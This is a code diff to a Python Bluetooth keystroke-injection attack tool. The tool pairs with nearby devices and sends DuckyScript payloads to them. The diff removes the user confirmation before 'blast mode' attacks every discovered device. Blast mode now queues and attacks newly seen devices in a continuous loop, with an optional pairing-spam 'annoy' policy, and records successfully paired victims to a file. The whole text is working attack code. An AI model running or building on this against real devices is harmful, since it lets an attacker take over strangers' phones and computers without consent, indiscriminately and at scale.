@@ -4,7 +4,7 @@ from pydbus import SystemBus
 from enum import Enum
 import os
 
-from utils.menu_functions import (main_menu, read_duckyscript, run, restart_bluetooth_daemon, get_target_address, perform_deep_scan)
+from utils.menu_functions import (main_menu, read_duckyscript, run, restart_bluetooth_daemon, get_target_address, perform_deep_scan, save_paired_device)
 from utils.register_device import register_hid_profile, agent_loop
 
 child_processes = []
@@ -634,7 +634,7 @@ def setup_and_connect(connection_manager, target_address, adapter_id):
     establish_connections(connection_manager)
     return connection_manager.clients[19]
 
-def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon_only=False):
+def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon_only=False, name="Unknown"):
     """Encapsulates the attack logic for a single target."""
     try:
         adapter = setup_bluetooth(target_address, adapter_id)
@@ -649,6 +649,9 @@ def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon
                 # 1. Connect and initialize pairing
                 hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
                 
+                # Successful pairing/connection reached here
+                save_paired_device(target_address, name)
+
                 if recon_only:
                     log.notice(f"[RECON] Successfully paired with {target_address}. Skipping payload.")
                     connection_manager.close_all()
@@ -681,49 +684,35 @@ def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon
         log.error(f"Critical failure during attack on {target_address}: {e}")
         return False
 
-def blast_loop(adapter_id, duckyscript, recon_only=False):
-    """Refined Blast Mode: Recon-first, then automated Targeting."""
+def blast_loop(adapter_id, duckyscript, initial_devices=None, recon_only=False, is_annoy_mode=False):
+    """Refined Blast Mode: Automated targeting with persistent discovery."""
     print(AnsiColorCode.CYAN + "\n" + "="*50)
-    print(f"B L A S T  M O D E  (Phase 1: Reconnaissance)")
+    print(f"B L A S T  M O D E  A C T I V E")
+    print(f"Sub-mode: {'RECON' if recon_only else 'ATTACK'} | Policy: {'ANNOY' if is_annoy_mode else 'ONCE'}")
     print("="*50 + AnsiColorCode.RESET)
-    print("[!] Performing 10-second environment scan...")
-    
+    print("[!] Successes are logged to 'paired_devices.txt'")
+    print("[!] Automated sequence running. Press Ctrl+C to stop.\n")
+
     blasted_devices = set()
     bus = SystemBus()
     adapter_obj = None
     
     try:
-        # 1. INITIAL RECON PHASE (Deep Scan Mode 2)
-        initial_targets = perform_deep_scan(duration_classic=8, duration_ble=10)
+        # Populate queue with initial devices if provided
+        queue = []
+        if initial_devices:
+            for addr, name in initial_devices:
+                queue.append((addr, name))
         
-        for addr, name in initial_targets.items():
-            print(f"  [+] Discovered: {name} ({addr})")
-
+        # Start persistent discovery for new targets
         adapter_obj = bus.get("org.bluez", f"/org/bluez/{adapter_id}")
         adapter_obj.StartDiscovery()
-            
-        print("\n" + "-"*50)
-        print(f"[!] Total Devices Found: {len(initial_targets)}")
-        if not initial_targets:
-            print("[!] No named devices found nearby. Blast Mode aborted.")
-            return
-
-        confirm = input(f"\n[?] Proceed to BLAST {len(initial_targets)} targets? (y/n): ").strip().lower()
-        if confirm != 'y':
-            print("[!] Blast Mode cancelled by user.")
-            return
-
-        # 2. PHASE 2: AUTOMATED BLAST
-        print(AnsiColorCode.CYAN + "\n" + "="*50)
-        print(f"B L A S T  M O D E  (Phase 2: Execution - {'RECON' if recon_only else 'ATTACK'})")
-        print("="*50 + AnsiColorCode.RESET)
-        print("[!] Automated sequence running. Press Ctrl+C to stop.\n")
-
+        
         while True:
+            # Check for new devices from DBus
             mngr = bus.get("org.bluez", "/")
             objs = mngr.GetManagedObjects()
             
-            new_targets = []
             for path, interfaces in objs.items():
                 if "org.bluez.Device1" in interfaces:
                     props = interfaces["org.bluez.Device1"]
@@ -731,21 +720,25 @@ def blast_loop(adapter_id, duckyscript, recon_only=False):
                     addr = path.split('/')[-1].replace('dev_', '').replace('_', ':')
                     
                     if name and addr not in blasted_devices and not name.startswith("00-00-00"):
-                        new_targets.append((addr, name))
+                        # Add to queue if not already there or blasted
+                        if (addr, name) not in queue:
+                            queue.append((addr, name))
 
-            for addr, name in new_targets:
+            # Process queue
+            while queue:
+                addr, name = queue.pop(0)
+                if addr in blasted_devices: continue
+
                 log.notice(f"\n[BLAST] TARGETING: {name} ({addr})")
-                log.info(f"Initiating sequence...")
-                
-                success = perform_attack(addr, adapter_id, duckyscript, is_annoy_mode=True, recon_only=recon_only)
+                success = perform_attack(addr, adapter_id, duckyscript, is_annoy_mode=is_annoy_mode, recon_only=recon_only, name=name)
                 
                 if success:
-                    log.notice(f"[BLAST] Target {addr} processed successfully.")
+                    log.notice(f"[BLAST] Target {addr} ({name}) SUCCESS.")
                 else:
-                    log.warning(f"[BLAST] Target {addr} skipped or failed.")
+                    log.warning(f"[BLAST] Target {addr} ({name}) FAILED/SKIPPED.")
                 
                 blasted_devices.add(addr)
-                time.sleep(3) # Cooldown
+                time.sleep(2) # Cooldown
             
             time.sleep(2) # Scan refresh rate
             
@@ -762,52 +755,55 @@ def main():
     parser.add_argument('--adapter', type=str, default='hci0', help='Specify the Bluetooth adapter to use (default: hci0)')
     args = parser.parse_args()
     adapter_id = args.adapter
+    setup_logging()
+    global log
+    log = logging.getLogger(__name__)
         
     main_menu()
     
-    # Check if user wants BLAST mode
-    print("\nSelect Target Mode:")
-    print("1: Single Target (Manual Select)")
-    print("2: Multi-Target Blast (Automated)")
-    target_mode = input("Enter mode (1/2): ").strip()
-
-    if target_mode == "2":
-        # BLAST MODE PATH
-        print("\nSelect Blast Sub-Mode:")
-        print("1: Recon Blast (Pairing Only - Detect Success)")
-        print("2: Attack Blast (Pairing + Automated Payload)")
-        blast_choice = input("Enter sub-mode (1/2): ").strip()
-        recon_only = (blast_choice == "1")
-
-        # Select Payload for Attack Blast
-        duckyscript = None
-        if not recon_only:
-            duckyscript = select_payload()
-            if not duckyscript: return
-        else:
-            duckyscript = [] # Empty for recon
-
-        blast_loop(adapter_id, duckyscript, recon_only=recon_only)
+    # UNIFIED FLOW: Scan/Select Target -> Mode Selection -> Execute
+    result = get_target_address()
+    if not result:
+        log.info("No target selected. Exiting.")
         return
 
-    # SINGLE TARGET PATH (Original Flow)
-    target_address = get_target_address()
-    if not target_address:
-        log.info("No target address provided. Exiting.")
-        return
-    
-    duckyscript = select_payload()
-    if not duckyscript:
-        log.info("Payload file not found or selected. Exiting.")
-        return
+    is_blast = False
+    initial_devices = None
+    target_address = None
 
-    print("\nSelect Attack Mode:")
-    print("1: Normal (One-shot payload)")
+    if isinstance(result, tuple) and result[0] == "BLAST_ALL":
+        is_blast = True
+        initial_devices = result[1]
+    else:
+        target_address = result
+
+    # 1. Choose Recon vs Attack
+    print("\nSelect Action Mode:")
+    print("1: Recon (Pairing Only)")
+    print("2: Attack (Pairing + Payload)")
+    action_choice = input("Enter choice (1/2): ").strip()
+    recon_only = (action_choice == "1")
+
+    # 2. Choose Once vs Annoy
+    print("\nSelect Attack Policy:")
+    print("1: Normal (One-shot per device)")
     print("2: Annoy (Persistent pairing spam)")
-    mode_choice = input("Enter mode (1/2): ")
-    is_annoy_mode = (mode_choice == "2")
+    policy_choice = input("Enter choice (1/2): ").strip()
+    is_annoy_mode = (policy_choice == "2")
 
-    perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode)
+    # 3. Select Payload (if Attack)
+    duckyscript = []
+    if not recon_only:
+        duckyscript = select_payload()
+        if not duckyscript:
+            log.info("No payload selected. Exiting.")
+            return
+
+    # 4. EXECUTE
+    if is_blast:
+        blast_loop(adapter_id, duckyscript, initial_devices=initial_devices, recon_only=recon_only, is_annoy_mode=is_annoy_mode)
+    else:
+        perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode=is_annoy_mode, recon_only=recon_only)
 
 def select_payload():
     """Helper to list and select payload."""
